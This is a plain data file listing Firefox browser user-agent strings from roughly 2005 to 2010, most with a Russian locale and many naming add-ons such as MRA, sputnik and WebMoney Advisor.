Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 GTB6
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.6) Gecko/2009011913 MRA 5.5 (build 02842) Firefox/3.0.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03278) Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03278) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 sputnik 2.0.1.41 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03270) Firefox/3.5.7 sputnik 2.1.0.18 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.5 (build 02842) Firefox/3.5.2
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; WinNT4.0; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.0.1.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.0.1.37
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100130 Ubuntu/9.10 (karmic) Namoroka/3.6.2pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03278) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.9.2) Gecko/20100115 Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.4 (build 02647) Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.1.0.18 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.8) Gecko/20051111 Firefox/1.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.4 (build 02647) Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 MRA 5.6 (build 03278) Firefox/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03278) Firefox/3.5.7 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.17) Gecko/2009122116 Firefox/3.0.17 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02746) Firefox/3.5.7 sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1b3) Gecko/20090304 Firefox/3.1b3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.3 (build 02564) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.1.5) Gecko/20091105 Fedora/3.5.5-1.fc11 Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.0.5;MEGAUPLOAD 1.0 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03278) Firefox/3.5.8 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.6 (build 03278) Firefox/3.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 Firefox/3.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02842) Firefox/3.5.8 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 (F4B70DE4-0AC5-45C3-A9FA-712BAA490906) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.5 (build 02842) Firefox/3.0.5;MEGAUPLOAD 1.0 (.NET CLR 2.0.50727)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.8) Gecko/20100216 Fedora/3.5.8-1.fc12 Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.4 (build 02647) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02842) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03278) Firefox/3.6 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 03116) Firefox/3.5.8 sputnik 2.0.1.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03278) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.9) Gecko/2009040821 MRA 5.5 (build 02842) Firefox/3.0.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02842) Firefox/3.5.8 sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.5 (build 02842) Firefox/3.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091111 Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 GTB6
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02842) Firefox/3.5.8 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02746) Firefox/3.5.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.6 (build 03278) Firefox/3.0.18 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02842) Firefox/3.5.8 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 AdCentriaIM/1.7 Firefox/3.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03278) Firefox/3.5.8 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.3a3pre) Gecko/20100308 Minefield/3.7a3pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03278) Firefox/3.6 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.3 (build 02564) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03278) Firefox/3.5.8 (.NET CLR 3.5.30729) sputnik unknown AutoPager/0.5.2.2 (http://www.teesoft.info/)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.5 (build 02842) Firefox/3.0.18 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03278) Firefox/3.5.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 WebMoney Advisor
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.18) Gecko/2010021501 Ubuntu/9.04 (jaunty) Firefox/3.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 AdCentriaIM/1.7 Firefox/3.5.7 (.NET CLR 2.0.50727) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03278) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.6 (build 03278) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 GTB6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.5 (build 02842) Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03278) Firefox/3.6.2 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.6 (build 03278) Firefox/3.0.17 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 AdCentriaIM/1.7 Firefox/2.0.0.20
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03278) Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.5 (build 02842) Firefox/3.0.18 sputnik 2.0.1.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03278) Firefox/3.6.2 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.2) Gecko/20100316 MRA 5.4 (build 02652) Firefox/3.6.2 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02746) Firefox/3.5.9 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 FirePHP/0.4
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.6 (build 03278) Firefox/3.0.18 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 FirePHP/0.4
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.9) Gecko/20100330 Fedora/3.5.9-1.fc12 Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.3 (build 02564) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.6 (build 03278) Firefox/3.5.9 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.0.12) Gecko/20070508 MRA 5.4 (build 02647) Firefox/1.5.0.12
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.6 (build 03278) Firefox/3.0.19 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03392) Firefox/3.6.2 (.NET CLR 3.5.21022) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.3) Gecko/20100409 Ubuntu/10.04 (lucid) Firefox/3.6.3
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.1.9) Gecko/20100402 Ubuntu/9.10 (karmic) Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 MRA 5.4 (build 02652) Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.6 (build 03278) Firefox/3.5.2 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03392) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.4 (build 02614) Firefox/3.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 ( .NET CLR 3.5.30729) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02793) Firefox/3.6.3 ( .NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3 GTB7.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100503 MRA 5.6 (build 03278) Firefox/3.6.4 Glubble/2.1.0.1 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.3 (build 02560) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02842) Firefox/3.5.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.9.2.3) Gecko/20100401 FireDownload/2.0.1 Firefox/3.6.3 FireTorrent/2.0.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03399) Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03392) Firefox/3.6.3 ( .NET CLR 3.5.21022) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 sputnik 2.2.0.32 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB7.0 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.5 (build 02746) Firefox/3.0.19 sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02842) Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.0.5;MEGAUPLOAD 1.0 ( )
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.6 (build 03399) Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB7.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100523 MRA 5.6 (build 03278) Firefox/3.6.4 Glubble/2.1.0.1 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 sputnik 2.2.0.34 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02842) Firefox/3.5.9 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 (.NET CLR 3.0.4506.2152)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03396) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.10) Gecko/20100504 Firefox/3.5.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.6 (build 03278) Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 AskTbPTV/3.8.0.12304 Firefox/3.6.3
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.1.9) Gecko/20100330 Fedora/3.5.9-1.fc11 Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03396) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.5 (build 02842) Firefox/3.0.5;MEGAUPLOAD 1.0 ( .NET CLR 3.0.4506.2152)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03278) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 GTB7.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03399) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.10) Gecko/20100504 MRA 5.6 (build 03278) Firefox/3.5.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100513 MRA 5.3 (build 02564) Firefox/3.6.4
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729)
